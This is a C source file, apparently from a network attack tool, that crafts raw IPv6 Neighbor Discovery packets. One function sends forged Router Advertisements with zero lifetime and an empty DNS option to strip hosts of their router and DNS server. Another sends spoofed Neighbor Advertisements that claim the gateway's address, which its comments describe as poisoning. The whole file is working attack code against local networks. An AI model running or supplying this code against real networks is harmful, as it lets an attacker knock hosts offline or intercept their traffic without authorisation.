#include "ndp_block.h"
#include <arpa/inet.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>
#include <net/if.h>
#include <netinet/icmp6.h>
#include <netinet/in.h>
#include <netinet/ip6.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <unistd.h>

// ICMPv6 pseudo-header for checksum calculation
struct pseudo_header6 {
  struct in6_addr src;
  struct in6_addr dst;
  uint32_t len;
  uint8_t zero[3];
  uint8_t next_header;
} __attribute__((packed));

// Standard 16-bit checksum
unsigned short checksum(void *b, int len) {
  unsigned short *buf = b;
  unsigned int sum = 0;
  unsigned short result;

  for (sum = 0; len > 1; len -= 2)
    sum += *buf++;
  if (len == 1)
    sum += *(unsigned char *)buf;
  sum = (sum >> 16) + (sum & 0xFFFF);
  sum += (sum >> 16);
  result = ~sum;
  return result;
}

int send_ndp_ra_block(int sockfd, unsigned char *src_mac,
                      unsigned char *src_ipv6) {
  struct ifreq if_idx;
  struct sockaddr_ll socket_address;
  char ifName[IFNAMSIZ] = "eth0";

  memset(&if_idx, 0, sizeof(struct ifreq));
  strncpy(if_idx.ifr_name, ifName, IFNAMSIZ - 1);
  if (ioctl(sockfd, SIOCGIFINDEX, &if_idx) < 0) {
    perror("SIOCGIFINDEX");
    return -1;
  }

  unsigned char dst_mac[6] = {0x33, 0x33, 0x00, 0x00, 0x00, 0x01};
  struct in6_addr dst_ipv6;
  inet_pton(AF_INET6, "ff02::1", &dst_ipv6);

  memset(&socket_address, 0, sizeof(struct sockaddr_ll));
  socket_address.sll_ifindex = if_idx.ifr_ifindex;
  socket_address.sll_halen = ETH_ALEN;
  memcpy(socket_address.sll_addr, dst_mac, 6);

  // Advanced features: RDNSS option (24 bytes) + SLLA Option(8 bytes)
  // Total ICMP payload: 16 (RA) + 8 (SLLA) + 24 (RDNSS) = 48 bytes
  int icmp_plen = sizeof(struct nd_router_advert) + 8 + 24;
  int packet_len = sizeof(struct ethhdr) + sizeof(struct ip6_hdr) + icmp_plen;
  unsigned char *buffer = malloc(packet_len);
  if (!buffer)
    return -1;
  memset(buffer, 0, packet_len);

  struct ethhdr *eth = (struct ethhdr *)buffer;
  memcpy(eth->h_source, src_mac, 6);
  memcpy(eth->h_dest, dst_mac, 6);
  eth->h_proto = htons(ETH_P_IPV6);

  struct ip6_hdr *ip6 = (struct ip6_hdr *)(buffer + sizeof(struct ethhdr));
  ip6->ip6_flow = htonl((6 << 28));
  ip6->ip6_plen = htons(icmp_plen);
  ip6->ip6_nxt = 58;
  ip6->ip6_hlim = 255;
  memcpy(&ip6->ip6_src, src_ipv6, 16);
  memcpy(&ip6->ip6_dst, &dst_ipv6, 16);

  struct nd_router_advert *ra =
      (struct nd_router_advert *)(buffer + sizeof(struct ethhdr) +
                                  sizeof(struct ip6_hdr));
  ra->nd_ra_type = 134;
  ra->nd_ra_code = 0;
  ra->nd_ra_curhoplimit = 64;
  // Setting High Priority (Preference): 0x08 (0x01 shifted to bits 3-4)
  ra->nd_ra_flags_reserved = 0x08; 
  ra->nd_ra_router_lifetime = htons(0); 
  ra->nd_ra_reachable = htonl(0);
  ra->nd_ra_retransmit = htonl(0);

  // Option 1: Source Link-Layer Address
  unsigned char *opt = (unsigned char *)(ra + 1);
  opt[0] = 1; 
  opt[1] = 1; 
  memcpy(opt + 2, src_mac, 6);

  // Option 2: RDNSS (Recursive DNS Server) with 0 lifetime to clear DNS
  unsigned char *rdnss = opt + 8;
  rdnss[0] = 25; // Type RDNSS
  rdnss[1] = 3;  // Length 3*8 = 24 bytes
  // rdnss[2-3] reserved
  uint32_t *rdnss_lifetime = (uint32_t *)(rdnss + 4);
  *rdnss_lifetime = htonl(0); // 0 Lifetime
  // Dummy DNS address (clear any existing)
  inet_pton(AF_INET6, "::", rdnss + 8);

  struct pseudo_header6 ps;
  memcpy(&ps.src, src_ipv6, 16);
  memcpy(&ps.dst, &dst_ipv6, 16);
  ps.len = htonl(icmp_plen);
  memset(ps.zero, 0, 3);
  ps.next_header = 58;

  int pseudo_len = sizeof(struct pseudo_header6) + icmp_plen;
  unsigned char *pseudo_buf = malloc(pseudo_len);
  if (pseudo_buf) {
    memcpy(pseudo_buf, &ps, sizeof(struct pseudo_header6));
    memcpy(pseudo_buf + sizeof(struct pseudo_header6), ra, icmp_plen);
    ra->nd_ra_cksum = checksum(pseudo_buf, pseudo_len);
    free(pseudo_buf);
  }

  if (sendto(sockfd, buffer, packet_len, 0, (struct sockaddr *)&socket_address,
             sizeof(struct sockaddr_ll)) < 0) {
    perror("sendto (Proper NDP RA)");
    free(buffer);
    return -1;
  }

  free(buffer);
  return 0;
}

int send_ndp_na_spoof(int sockfd, unsigned char *dst_mac, unsigned char *src_mac,
                      unsigned char *gateway_ipv6) {
  struct ifreq if_idx;
  struct sockaddr_ll socket_address;
  char ifName[IFNAMSIZ] = "eth0";

  memset(&if_idx, 0, sizeof(struct ifreq));
  strncpy(if_idx.ifr_name, ifName, IFNAMSIZ - 1);
  if (ioctl(sockfd, SIOCGIFINDEX, &if_idx) < 0) {
    perror("SIOCGIFINDEX");
    return -1;
  }

  memset(&socket_address, 0, sizeof(struct sockaddr_ll));
  socket_address.sll_ifindex = if_idx.ifr_ifindex;
  socket_address.sll_halen = ETH_ALEN;
  memcpy(socket_address.sll_addr, dst_mac, 6);

  int icmp_plen = sizeof(struct nd_neighbor_advert) + 8;
  int packet_len = sizeof(struct ethhdr) + sizeof(struct ip6_hdr) + icmp_plen;
  unsigned char *buffer = malloc(packet_len);
  if (!buffer)
    return -1;
  memset(buffer, 0, packet_len);

  struct ethhdr *eth = (struct ethhdr *)buffer;
  memcpy(eth->h_source, src_mac, 6);
  memcpy(eth->h_dest, dst_mac, 6);
  eth->h_proto = htons(ETH_P_IPV6);

  struct ip6_hdr *ip6 = (struct ip6_hdr *)(buffer + sizeof(struct ethhdr));
  ip6->ip6_flow = htonl((6 << 28));
  ip6->ip6_plen = htons(icmp_plen);
  ip6->ip6_nxt = 58;
  ip6->ip6_hlim = 255;
  memcpy(&ip6->ip6_src, gateway_ipv6, 16); 
  // If dst_mac is global nodes, use all-nodes address
  if (dst_mac[0] == 0x33) {
      inet_pton(AF_INET6, "ff02::1", &ip6->ip6_dst);
  } else {
      // In a real spoof, we should also know the victim's link-local,
      // but for "broadcast" poisoning, we can just send to all-nodes or use multicast
      inet_pton(AF_INET6, "ff02::1", &ip6->ip6_dst);
  }

  struct nd_neighbor_advert *na =
      (struct nd_neighbor_advert *)(buffer + sizeof(struct ethhdr) +
                                    sizeof(struct ip6_hdr));
  na->nd_na_type = 136;
  na->nd_na_code = 0;
  // Flags: Router(1), Solicited(0), Override(1)
  na->nd_na_flags_reserved = 0xA0; // 1010_0000 in bits 5-7
  memcpy(&na->nd_na_target, gateway_ipv6, 16);

  // Option: Target Link-Layer Address
  unsigned char *opt = (unsigned char *)(na + 1);
  opt[0] = 2; // Type TLLA
  opt[1] = 1; 
  memcpy(opt + 2, src_mac, 6);

  struct pseudo_header6 ps;
  memcpy(&ps.src, &ip6->ip6_src, 16);
  memcpy(&ps.dst, &ip6->ip6_dst, 16);
  ps.len = htonl(icmp_plen);
  memset(ps.zero, 0, 3);
  ps.next_header = 58;

  int pseudo_len = sizeof(struct pseudo_header6) + icmp_plen;
  unsigned char *pseudo_buf = malloc(pseudo_len);
  if (pseudo_buf) {
    memcpy(pseudo_buf, &ps, sizeof(struct pseudo_header6));
    memcpy(pseudo_buf + sizeof(struct pseudo_header6), na, icmp_plen);
    na->nd_na_cksum = checksum(pseudo_buf, pseudo_len);
    free(pseudo_buf);
  }

  if (sendto(sockfd, buffer, packet_len, 0, (struct sockaddr *)&socket_address,
             sizeof(struct sockaddr_ll)) < 0) {
    perror("sendto (NDP NA)");
    free(buffer);
    return -1;
  }

  free(buffer);
  return 0;
}
